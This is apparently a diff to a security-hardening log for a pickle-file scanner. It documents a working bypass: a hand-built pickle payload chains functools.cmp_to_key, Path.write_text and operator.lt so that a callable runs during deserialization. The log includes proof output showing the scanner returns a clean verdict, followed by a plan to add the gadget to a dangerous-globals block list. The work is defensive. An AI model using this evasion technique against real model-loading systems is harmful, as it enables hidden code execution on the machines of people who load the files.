@@ -3288,3 +3288,114 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add descriptor-object tracking, cached-property
 state modeling, or stack-flow simulation.
+
+## Turn 71 - `functools.cmp_to_key` rich-comparison callback gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using a clean comparator
+adapter plus a clean comparison helper to invoke an attacker-selected callable
+during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_functools_cmp_to_key_operator_lt_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("functools", "cmp_to_key"),
+        sg("pathlib", "Path.write_text"),
+        b"\x85R\x940",
+        b"h\x00",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x85R\x940",
+        b"h\x00",
+        s("x"),
+        b"\x85R\x940",
+        sg("operator", "lt"),
+        b"h\x01h\x02\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=170`, `bytes_total=170`, `opcode_count=39`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `functools.cmp_to_key`,
+  `pathlib.Path.write_text`, `pathlib.PosixPath`, and `operator.lt`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.lt` call returns
+  two `<functools.KeyWrapper ...>` objects and does not create
+  `/tmp/ma_functools_cmp_to_key_operator_lt_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_functools_cmp_to_key_operator_lt_marker`, writes `x`, and returns
+  `False`
+- RCE mechanism: `functools.cmp_to_key(callable)` creates key-wrapper objects
+  whose rich-comparison methods call the supplied comparator as
+  `callable(left.obj, right.obj)`. The payload wraps
+  `pathlib.Path.write_text`, builds one wrapper around the marker path and one
+  around `"x"`, then calls `operator.lt(left, right)`. The comparison invokes
+  `Path.write_text(marker, "x")` before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `functools.cmp_to_key` is absent from `DANGEROUS_GLOBALS`; current
+  `functools` critical coverage includes `cache`, `cached_property.__get__`,
+  `lru_cache`, `reduce`, and `singledispatch`.
+- `operator.lt` is absent from `DANGEROUS_GLOBALS`; only `operator.call`,
+  `operator.attrgetter`, `operator.itemgetter`, and `operator.methodcaller` are
+  listed.
+- The payload uses only currently clean globals:
+  `functools.cmp_to_key`, `pathlib.Path.write_text`, `pathlib.PosixPath`, and
+  `operator.lt`.
+- The dangerous callable is hidden inside synthesized rich-comparison wrapper
+  objects, so the final call target is the clean comparison helper rather than
+  the attacker-selected function.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a comparator-wrapper sink with a precise static
+factory. The focused next block should add a sorted `DANGEROUS_GLOBALS` entry
+for `("functools", "cmp_to_key")`, plus a manual-pickle oracle regression
+proving scan-time detection before comparison creates the marker. Blocking
+generic `operator.lt` is not required for this specific sink, so the hot path
+can remain one static binary-search policy lookup.
+
+## Turn 72 - Block `functools.cmp_to_key` rich-comparison wrappers
+
+Blocking plan:
+
+- Add `("functools", "cmp_to_key")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. The factory accepts an attacker-selected comparator and produces
+  key-wrapper objects whose rich-comparison methods invoke it.
+- Leave generic `operator.lt` allowed for this focused block. It only forces
+  comparison; the dangerous sink is the comparator wrapper factory.
+- Add a CPython oracle regression that builds the manual
+  `cmp_to_key(Path.write_text)` payload, verifies scan-time detection on
+  control and RCE variants, proves the control wrapper pair does not create the
+  marker, then proves the full comparison writes the marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one tuple in the sorted static table, no rich-comparison
+modeling.
